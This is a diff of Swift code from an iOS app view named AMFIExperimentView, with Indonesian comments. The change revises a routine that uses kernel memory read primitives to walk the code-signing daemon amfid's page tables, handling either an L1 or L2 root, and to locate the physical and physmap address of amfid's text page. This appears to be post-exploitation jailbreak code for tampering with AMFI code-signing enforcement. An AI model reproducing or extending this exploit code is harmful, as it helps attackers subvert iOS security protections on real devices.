@@ -6866,8 +6866,11 @@ struct AMFIExperimentView: View {
         detail += "Target VA: 0x\(String(format: "%llx", targetVA))\n"
         detail += "L1[\(l1Idx)] L2[\(l2Idx)] L3[\(l3Idx)] off=0x\(String(format: "%x", pageOff))\n"
 
+        var amfidPmapRootOff: UInt64 = 0
+        var amfidPmapRootIsL1 = false
+
         if amfidPmap != 0 {
-            // Read L1 root dari amfid pmap (+0x00 atau +0x08)
+            // Read root dari amfid pmap (+0x00 atau +0x08)
             for (off, name) in [(UInt64(0), "+0x00"), (UInt64(8), "+0x08")] {
                 let l1Root = ds_kreadptr(amfidPmap + off)
                 guard isReasonablePhysTT(l1Root) || isKernelOrPhysmapVA(l1Root) else { continue }
@@ -6882,14 +6885,25 @@ struct AMFIExperimentView: View {
 
                 guard isSafePhysmapKRWAddress(l1VA) || isSafeKernelKreadAddress(l1VA) else { continue }
 
-                let l1Entry = ds_kread64_safe(l1VA + l1Idx * 8)
-                guard l1Entry & 0x3 == 0x3 else { continue }
+                // l1VA adalah base pointer ke root table
+                var l2VA = l1VA
+                var isL1 = false
+                var l1Entry: UInt64 = 0
+                var l2Entry = ds_kread64_safe(l2VA + l2Idx * 8)
 
-                let l2Phys = l1Entry & 0x0000FFFFFFFC0000
-                let l2VA = l2Phys &- gPhysBase &+ gVirtBase
-                guard isSafePhysmapKRWAddress(l2VA) else { continue }
+                if (l2Entry & 0x3) != 0x3 {
+                    // Coba asumsi root adalah L1 (47-bit VA space)
+                    l1Entry = ds_kread64_safe(l1VA + l1Idx * 8)
+                    if (l1Entry & 0x3) == 0x3 {
+                        let l2Phys = l1Entry & 0x0000FFFFFFFC0000
+                        l2VA = l2Phys &- gPhysBase &+ gVirtBase
+                        if isSafePhysmapKRWAddress(l2VA) {
+                            l2Entry = ds_kread64_safe(l2VA + l2Idx * 8)
+                            isL1 = true
+                        }
+                    }
+                }
 
-                let l2Entry = ds_kread64_safe(l2VA + l2Idx * 8)
                 guard l2Entry & 0x3 == 0x3 else { continue }
 
                 let l3Phys = l2Entry & 0x0000FFFFFFFC0000
@@ -6901,8 +6915,11 @@ struct AMFIExperimentView: View {
 
                 let pagePhys = l3Entry & 0x0000FFFFFFFC0000
                 amfidTextPhys = pagePhys
-                detail += "✅ Page table walk OK (\(name))\n"
-                detail += "  L1=0x\(String(format: "%llx", l1Entry))\n"
+                amfidPmapRootOff = off
+                amfidPmapRootIsL1 = isL1
+
+                detail += "✅ Page table walk OK (\(name), rootIsL1=\(isL1))\n"
+                if isL1 { detail += "  L1=0x\(String(format: "%llx", l1Entry))\n" }
                 detail += "  L2=0x\(String(format: "%llx", l2Entry))\n"
                 detail += "  L3=0x\(String(format: "%llx", l3Entry))\n"
                 detail += "  amfid text phys: 0x\(String(format: "%llx", pagePhys))\n"
@@ -6992,27 +7009,37 @@ struct AMFIExperimentView: View {
             let p2Idx = (pageVA >> 25) & 0x7FF
             let p1Idx = (pageVA >> 36) & 0x7
 
-            // Reuse L1 root dari amfid pmap
+            // Reuse root dari amfid pmap
             guard amfidPmap != 0 else { break }
-            let l1Root = ds_kreadptr(amfidPmap)
-            guard isReasonablePhysTT(l1Root) else { break }
+            let rootPtr = ds_kreadptr(amfidPmap + amfidPmapRootOff)
+            guard isReasonablePhysTT(rootPtr) || isKernelOrPhysmapVA(rootPtr) else { break }
 
-            let l1VA2 = l1Root &- gPhysBase &+ gVirtBase
-            guard isSafePhysmapKRWAddress(l1VA2) else { break }
-            let l1e = ds_kread64_safe(l1VA2 + p1Idx * 8)
-            guard l1e & 0x3 == 0x3 else { break }
+            let rootVA: UInt64
+            if isReasonablePhysTT(rootPtr) {
+                rootVA = rootPtr &- gPhysBase &+ gVirtBase
+            } else {
+                rootVA = rootPtr
+            }
+            guard isSafePhysmapKRWAddress(rootVA) || isSafeKernelKreadAddress(rootVA) else { break }
 
-            let l2p = l1e & 0x0000FFFFFFFC0000
-            let l2v = l2p &- gPhysBase &+ gVirtBase
-            guard isSafePhysmapKRWAddress(l2v) else { break }
+            var l2v = rootVA
+            if amfidPmapRootIsL1 {
+                let l1e = ds_kread64_safe(rootVA + p1Idx * 8)
+                if (l1e & 0x3) == 0x3 {
+                    let l2p = l1e & 0x0000FFFFFFFC0000
+                    l2v = l2p &- gPhysBase &+ gVirtBase
+                } else { continue }
+            }
+
+            guard isSafePhysmapKRWAddress(l2v) else { continue }
             let l2e = ds_kread64_safe(l2v + p2Idx * 8)
-            guard l2e & 0x3 == 0x3 else { break }
+            guard l2e & 0x3 == 0x3 else { continue }
 
             let l3p = l2e & 0x0000FFFFFFFC0000
             let l3v = l3p &- gPhysBase &+ gVirtBase
-            guard isSafePhysmapKRWAddress(l3v) else { break }
+            guard isSafePhysmapKRWAddress(l3v) else { continue }
             let l3e = ds_kread64_safe(l3v + pIdx * 8)
-            guard l3e & 0x1 == 0x1 else { break }
+            guard l3e & 0x1 == 0x1 else { continue }
 
             let pagePhys2 = l3e & 0x0000FFFFFFFC0000
             let pagePhysmapVA = pagePhys2 &- gPhysBase &+ gVirtBase
